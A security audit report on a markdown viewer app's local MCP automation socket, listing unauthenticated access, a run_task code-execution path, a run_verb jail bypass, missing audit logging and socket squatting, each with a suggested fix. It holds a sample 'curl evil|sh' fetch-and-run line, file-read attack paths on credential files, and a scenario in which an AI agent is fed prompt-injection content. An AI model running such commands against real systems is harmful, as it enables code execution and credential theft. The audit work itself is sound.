# Pre-launch audit — Automation / remote-control surface exposure

**Dimension:** who can connect to the app's automation channels, what authentication (if
any) gates them, and what file edits / verbs / process spawns / AX actions an *unauthorized
local client* can drive.

**Reviewer lens:** MCP stdio server, the in-app MCP unix-socket listener + bridge, the
script-verb action bus reachable through MCP, the task/command runner, and the remote-core
attach transport.

**Date:** 2026-07-09 · **Scope:** `Sources/ViewerCore/Automation/`,
`Sources/ViewerUI/Automation/`, `Sources/MarkdownViewer/main.swift`,
`Sources/ViewerCore/TaskRunner/`, `Sources/ViewerCore/RemoteCoreAttach.swift`.

---

## Executive summary

The app ships an **always-on, unauthenticated local control plane**. Every GUI launch binds
a per-user unix-domain socket (`~/Library/Application Support/MarkdownViewer/mcp.sock`,
`chmod 0600`) and serves the *entire* MCP tool catalog on it —
`Sources/MarkdownViewer/main.swift:225`, `Sources/ViewerCore/Automation/MCPSocketListener.swift`.
The **only** access control is the socket's file mode: same-uid. There is **no peer-credential
check, no capability/auth token, no user consent prompt, and no way to disable the endpoint**.

That would be an ordinary local-IPC posture for a read-only inspector. It is not ordinary for
this surface, because the tool catalog reachable on that socket can:

- **Execute arbitrary code as the user** (`run_task` → `npm run …` / `make …` / `cargo …`,
  whose command *bodies* are repo-controlled shell — the "allowlist" gates only the task
  *id*, not what it runs).
- **Read and exfiltrate any file the user can read, anywhere on disk** — the carefully-built
  home/temp containment jail on `open_path`/`search_files`/`move_file` is **bypassed** by the
  `run_verb` action bus (`open` / `save-copy` / `session-open-folder` take raw absolute paths
  with no jail).
- **Move / rename / write files, edit open buffers, and drive ~60 script verbs** on the live
  document model.

The threat model the code documents ("same-user only") conflates *"the user"* with *"any
process running as the user."* Those differ: a sandboxed helper, a malicious script the user
ran once, a compromised dependency in some unrelated tool, or a second app can all reach this
socket and obtain **full user-privilege code execution and file exfiltration with zero
consent and zero audit trail**. For a document viewer/editor about to ship, that is the
headline risk of this dimension.

Nothing here is a crash or data-loss-in-normal-use bug (no P0). The findings are
security-posture P1/P2: the exposure is real and reachable, but mitigated by the same-uid
boundary and the fact that an attacker already needs local code execution as the user.

**Positive:** the transport engineering itself is careful — a 16 MiB frame cap guards against
memory-DoS, `SO_NOSIGPIPE` + raw `write(2)` avoid uncatchable teardown crashes, the jail
(where applied) resolves symlinks physically, regex tools are ReDoS-guarded, `run_task`
spawns shell-free, and `move_file`/`rename_symbol` default to dry-run. The remote-core attach
is *outbound-only* over an opt-in env-named unix socket (no inbound network surface).

---

## Methodology

Static read of the automation subsystem end to end. Files examined in full or in the relevant
regions:

- `Sources/ViewerCore/Automation/MCPSocketListener.swift` (full) — the socket bind/accept loop.
- `Sources/ViewerCore/Automation/MCPSocketBridge.swift` (full) — the `--mcp-connect` client bridge.
- `Sources/ViewerCore/Automation/MCPServer.swift` (full) — the JSON-RPC dispatch + main-actor bridge.
- `Sources/ViewerCore/Automation/MCPToolCatalog.swift` (dispatch table, `run_task`,
  `move_file`, `run_verb`, `search_files`, `find`, the containment fence `validatedExistingURL`).
- `Sources/ViewerCore/Automation/MCPFraming.swift` (size caps).
- `Sources/ViewerUI/Automation/ScriptVerbDispatch.swift` (`open`, `save-copy`, `reload`, …).
- `Sources/ViewerCore/Automation/ScriptVerbCatalog.swift` (verb vocabulary).
- `Sources/ViewerCore/TaskRunner/RunnableTaskDiscovery.swift` + `RunSpec.swift` (the runner allowlist).
- `Sources/MarkdownViewer/main.swift:188-225, 4136-4326` (launch wiring, `--mcp-stdio` / `--mcp-connect`).
- `Sources/ViewerCore/RemoteCoreAttach.swift` (remote-core transport).

Verification technique: traced each externally-reachable tool from `MCPToolCatalog.dispatch` /
`dispatchAsync` down to the host method it calls; grepped for peer-credential checks
(`getpeereid`/`LOCAL_PEERCRED`/`SO_PEERCRED` — **none exist**), for an MCP disable gate
(`MDV_DISABLE*`/`mcpEnabled` — **none**), and for audit-logging in the tool path
(`AuditLog` in `MCPToolCatalog.swift` — **zero references**). No code was run; no tests
executed (static analysis only, per constraints).

---

## Findings

### F1 — Always-on, unauthenticated local control socket; no peer-credential check, no opt-out `[P1]`

**File:** `Sources/MarkdownViewer/main.swift:225` · `Sources/ViewerCore/Automation/MCPSocketListener.swift:69-110`

**Evidence.** `startMCPSocketListener()` runs unconditionally for every normal GUI launch
(`main.swift:225`), with no preference, env gate, or feature flag guarding it (grep for
`MDV_DISABLE*`/`mcpEnabled`/`disableMCP` → none). `MCPSocketListener.start()` binds the
socket and `chmod(path, 0o600)` (line 96); the header comment states the entire security
model: *"same-user only … no TCP, no remote surface, no auth token in v1."* No
`getpeereid`/`LOCAL_PEERCRED` check exists anywhere in the automation tree. `MCPServer`
dispatches `tools/call` with no session/auth state (`MCPServer.swift:344-371`).

**Impact.** Any process running as the same uid — not just the agent the user intended to
grant control — can open this socket and drive the full tool catalog (code exec, file
read/write, buffer edits) with no consent prompt and no way for the user to turn the endpoint
off. A read-only markdown viewer silently exposes a user-privilege control channel to the
entire local uid.

**Suggested fix.** (a) Gate the listener behind an explicit opt-in (a preference or launch
flag), off by default; (b) verify the peer with `getpeereid`/`LOCAL_PEERCRED` and reject
anything that isn't the expected client family; (c) for real isolation, require a
per-session capability token minted in the app UI and passed on `initialize`, rejecting
`tools/call` until presented. At minimum ship a visible indicator + kill switch.

**Fix size:** M · **Fix risk:** careful (changes how `--mcp-connect` bridges attach; needs
the bridge to carry the token).

---

### F2 — `run_task` is arbitrary code execution gated only by socket access `[P1]`

**File:** `Sources/ViewerCore/Automation/MCPToolCatalog.swift:293-320, 453-489` ·
`Sources/ViewerCore/TaskRunner/RunnableTaskDiscovery.swift:35-60` · `RunSpec.swift:44-57`

**Evidence.** The tool description claims *"arbitrary commands are not expressible"* — but the
allowlist gates only the task **id**. `RunnableTaskDiscovery.packageJsonTasks` turns every key
under `scripts` into `npm run <name>` (`RunnableTaskDiscovery.swift:50-58`); `makefileTasks`
into `make <target>`; `cargoTasks` into `cargo run`/`cargo test`. The *command body* those
drivers execute is fully author-controlled shell (an npm script or Makefile recipe is
literal shell). `runTask` re-discovers, finds the id, and spawns it
(`MCPToolCatalog.swift:459-481`). The spawn is shell-free at the argv layer, but `npm`/`make`
themselves invoke a shell on the recipe — so the "shell-free spawn" only prevents injection
*into the argv*, not execution of the attacker-authored recipe.

**Impact.** A same-uid client (see F1) plants a `package.json` with
`"scripts": {"x": "curl evil|sh"}` anywhere under `$HOME` (or points at any existing repo
with a build script), calls `list_runnable_tasks` then `run_task` → **arbitrary code
execution as the user**, bounded only by a 600 s timeout and 64 KB output cap. No consent, no
audit (F5).

**Suggested fix.** Treat `run_task` as the privileged operation it is: require the F1
capability token, and/or a per-invocation user confirmation surfaced in the app UI (show the
resolved command line before running). Document honestly that discovered tasks run
author-controlled shell.

**Fix size:** M · **Fix risk:** careful (interacts with the agent-services UX; a confirm
prompt changes the automation contract).

---

### F3 — Home-jail containment fence bypassed by `run_verb` (`open` / `save-copy` / `session-open-folder`) `[P1]`

**File:** `Sources/ViewerUI/Automation/ScriptVerbDispatch.swift:182, 390, 553` ·
`Sources/ViewerCore/Automation/MCPToolCatalog.swift:804-812, 1153-1187`

**Evidence.** `open_path`, `search_files`, `move_file`, and `run_task` all route through
`validatedExistingURL`, which enforces a home/temp jail and even resolves symlinks physically
to defeat symlink escape (`MCPToolCatalog.swift:1153-1187`, comments cite AUDIT S3). But the
`run_verb` tool dispatches the *same class of file operations with no jail at all*:

- `run_verb "open /etc/hosts"` → `ScriptVerbDispatch.swift:182` → `model.openPath(URL(fileURLWithPath: arg))` — **any** absolute path the user can read, then `visible_text` returns its content.
- `run_verb "save-copy /any/writable/path"` → `ScriptVerbDispatch.swift:390` → `model.saveCopyOfCurrentTab(to:)` — writes the active tab's content to **any** writable path (no jail).
- `run_verb "session-open-folder /"` → opens arbitrary roots for `search_files`-style traversal.

`runVerb` only validates that the token exists in `ScriptVerbCatalog`
(`MCPToolCatalog.swift:807`); it never applies the path jail.

**Impact.** The documented containment boundary is a fiction: an unauthorized client reads any
user-readable file *outside* `$HOME` (other volumes, `/private`, `/var`, world-readable
system files) via `open`+`visible_text`, and writes current-tab content to arbitrary paths
via `save-copy`. This defeats the exact control the fence code claims to provide.

**Suggested fix.** Route `open`/`open-lazy`/`open-as`/`save-copy`/`session-open-*` through the
same `validatedExistingURL` jail when reached via MCP, or drop those verbs from the
MCP-reachable `run_verb` allowlist (keep them for the local `--script`/palette path where the
actor is the user, not a network peer).

**Fix size:** M · **Fix risk:** careful (must not break the local palette/scripting path,
which legitimately opens anywhere — the jail should apply to the *MCP* entry only).

---

### F4 — In-jail arbitrary file read / screenshot exfiltration, no consent or audit `[P2]`

**File:** `Sources/ViewerCore/Automation/MCPToolCatalog.swift:590-663` (`search_files`),
`684-733` (`visible_text`), `snapshot_window`

**Evidence.** Even *within* the home jail, `open_path`+`visible_text` (10 MB cap) returns full
file contents and `search_files` greps and returns matching lines under any `$HOME` subtree
(`MCPToolCatalog.swift:590`). `$HOME` holds `~/.ssh/`, `~/.aws/credentials`,
`~/Library/.../Cookies`, keychain-adjacent files, `.env` files, etc. `snapshot_window`
returns a capture of on-screen content.

**Impact.** Combined with F1 (no auth), any same-uid process silently exfiltrates the user's
secrets through the socket — no prompt, no log entry (F5). This is the "read" half of the
exposure; F2/F3 are the "write/exec" half.

**Suggested fix.** Gate read tools behind the F1 capability token; consider excluding
sensitive dotfile trees (`~/.ssh`, `~/.aws`, `~/.gnupg`, keychains) from `open_path` /
`search_files` even inside the jail, and record every read to the audit log (F5).

**Fix size:** S–M · **Fix risk:** safe (additive denylist + audit) to careful (token gating).

---

### F5 — No audit trail of agent actions `[P2]`

**File:** `Sources/ViewerCore/Automation/MCPToolCatalog.swift` (0 `AuditLog` references) ·
`Sources/ViewerCore/Automation/MCPServer.swift:562-573`

**Evidence.** The `AuditLog.shared.record` hook exists and is used for the RustCore call path
(`main.swift:188`), but **no MCP tool invocation records to it**. `MCPServer.log` routes only
to the in-memory `Obs` ring buffer, and the code comment explicitly says *"per the security
model the MCP host must NEVER read that buffer back out (no audit/consent)"*
(`MCPServer.swift:562-567`) — i.e. there is deliberately no persistent, user-inspectable log
of what an agent did.

**Impact.** File moves, process spawns (F2), edits, and exfiltrating reads (F4) leave no
forensic record. After a compromise the user cannot answer "what did it touch / run / read?"
This also undermines any post-hoc trust model.

**Suggested fix.** Emit an `AuditLog` entry for every `tools/call` (tool name + key args, path
targets, exit codes) to a persisted, user-viewable log. Cheap, non-behavioral, and materially
improves the posture.

**Fix size:** S · **Fix risk:** safe.

---

### F6 — No `initialize` handshake required before `tools/call` — removes the natural auth point `[P2]`

**File:** `Sources/ViewerCore/Automation/MCPServer.swift:344-371` ·
`Sources/ViewerCore/Automation/MCPSocketBridge.swift:97-103`

**Evidence.** `dispatch` serves `tools/list` and `tools/call` with no requirement that
`initialize` ran first — deliberately, so the self-healing bridge can reconnect a fresh socket
mid-session without re-handshaking (`MCPSocketBridge.swift:100-103`: *"the app-side MCP server
is STATELESS (tools/list & tools/call are not gated on initialize)"*).

**Impact.** Statelessness is a reasonable reconnect design, but it means there is **no point in
the protocol at which a capability token or auth negotiation could be enforced** — the very
first byte a peer sends can be a `tools/call`. This is the structural enabler of F1–F4: any
fix that adds auth (F1) must also decide how a reconnecting bridge re-presents the token
without a handshake.

**Suggested fix.** Accept a capability token as a connection-level credential (e.g. first line
on the socket, or an ancillary-data `SCM_CREDS`/token exchange) that the bridge caches and
re-sends on every reconnect — preserving statelessness while adding a gate.

**Fix size:** M · **Fix risk:** careful (touches the reconnect contract).

---

### F7 — Socket-path squatting: no server-identity verification enables same-uid MITM of the agent channel `[P2]`

**File:** `Sources/ViewerCore/Automation/MCPSocketListener.swift:66-74` ·
`Sources/ViewerCore/Automation/MCPSocketBridge.swift:19-43`

**Evidence.** `start()` unconditionally `unlink`s any node at the socket path before binding
(`MCPSocketListener.swift:74`), on the stated assumption that *"the app is single-instance, so
a node there is always a leftover."* The `--mcp-connect` bridge simply `connect()`s to the
path with no verification of *who* it reached (`MCPSocketBridge.swift:19-43`). Nothing (a
lockfile, a PID handshake, a signed server identity) confirms the bound socket belongs to the
real app.

**Impact.** A same-uid attacker can `unlink` the app's live socket and bind its own listener
at the same path (or win the race at launch). Claude Code's bridge — and its self-healing
reconnect loop, which re-dials the *path* forever — then connects to the **attacker's** fake
MCP server. The attacker can feed the agent forged tool results / prompt-injection content, or
harvest everything the agent sends. The single-instance assumption is an availability
assumption, not a security one.

**Suggested fix.** Have the bridge verify server identity on connect (e.g. the server proves a
per-launch secret written to a `0600` sibling file the bridge also reads, or an
`initialize`-time signed nonce). Consider `flock`-guarding the socket path so a second binder
can't silently take over.

**Fix size:** M · **Fix risk:** careful.

---

## Positive observations

- **Frame-size DoS guard.** `MCPFraming.maxBodyBytes = 16 MiB` is enforced on both the
  Content-Length and newline-delimited paths, with negative/oversized `Content-Length`
  rejected (`MCPFraming.swift:35, 154-159, 123`). A malicious huge frame can't OOM the app.
- **Symlink-physical jail (where applied).** `validatedExistingURL` resolves symlinks on both
  operands and uses anchored `home + "/"` / `temp + "/"` prefixes, explicitly closing the
  sibling-prefix (`/var/folders/…/T-attacker`) and symlink-escape holes
  (`MCPToolCatalog.swift:1153-1187`). The containment logic itself is sound — the gap is that
  `run_verb` doesn't use it (F3).
- **Robust transport teardown.** `SO_NOSIGPIPE` (`MCPSocketBridge.swift:40`), raw `write(2)`
  instead of the exception-raising `FileHandle.write` (`MCPServer.swift:526-543`), a bounded
  main-actor bridge that returns `-32603` on a wedge instead of hanging
  (`MCPServer.swift:300-334`), and the orphaned-bridge PPID guard
  (`MCPSocketBridge.swift:194-205`) are all careful, production-grade choices.
- **`chmod` before `listen`.** The socket is `chmod 0600` *before* `listen(2)`
  (`MCPSocketListener.swift:96-97`), so there is no accept window during which the default-umask
  mode is exploitable (a `bind`→`chmod` TOCTOU would be moot anyway since `connect` to a
  not-yet-listening socket is refused).
- **Shell-free `run_task` argv + dry-run defaults.** `run_task` spawns via `/usr/bin/env` with
  tokenized argv (no argv injection); `move_file` and `rename_symbol` default to dry-run and
  never overwrite an existing destination (`MCPToolCatalog.swift:322-337, 469-473`).
- **ReDoS guards** on `find` and `search_files` regex inputs (`MCPToolCatalog.swift:521-528,
  615`).
- **Remote-core attach is outbound-only and opt-in.** `RemoteCoreAttach` connects *out* to an
  `MDV_REMOTE_SOCKET` unix path (an `ssh -L`-forwarded `mdv-serve`), env-gated, with the ssh
  tunnel as the trust boundary and auto-revert to in-process on connection loss
  (`RemoteCoreAttach.swift:4-64`). The app opens **no inbound network surface** for the core.

---

## Coverage gaps (not examined, or examined only shallowly)

- **The AX driver / real-event synthesis** (`AXDriverCore.swift`, `UIEventSynth.swift`,
  `AXUIElementNode.swift`, `ClickTargetRegistry.swift`) — what element/verb set an AX-driven
  client can reach, and whether AX actions honor any containment. The task framed AX as a
  first-class concern; I traced the MCP→verb→model path but did **not** deep-audit the AX
  adapter's own reachable surface.
- **The `mdv-serve` daemon** (`rust-core/crates/serve`) — if it can be configured to listen on
  TCP (vs the ssh-forwarded unix socket the app dials), its own auth posture is out of scope
  here and should get a dedicated review. I only confirmed the *app-side* attach is outbound.
- **`canvas_*` tool file I/O** (`canvas_open`/`canvas_save`/`canvas_export`/`canvas_kit_import`)
  — whether these honor the home jail was not traced; they take paths and touch disk.
- **The LSP-backed async tools' path handling** (`goto_definition`/`find_references`/
  `who_calls`/`rename_symbol`) — `rename_symbol` with `apply:true` edits files via the language
  server; I confirmed `move_file` is jailed but did not fully trace whether `rename_symbol`'s
  edit set is confined.
- **Directory permissions of `~/Library/Application Support/MarkdownViewer/`** — I relied on the
  socket's own `0600` mode (sufficient to block cross-uid connect); I did not verify the parent
  directory is `0700`, which would matter if the socket mode ever regressed.
- **Rate/quantity limits** — no per-connection request throttle was assessed; a same-uid client
  could hammer `run_task`/`search_files` for resource exhaustion (bounded per-call, unbounded
  in aggregate).
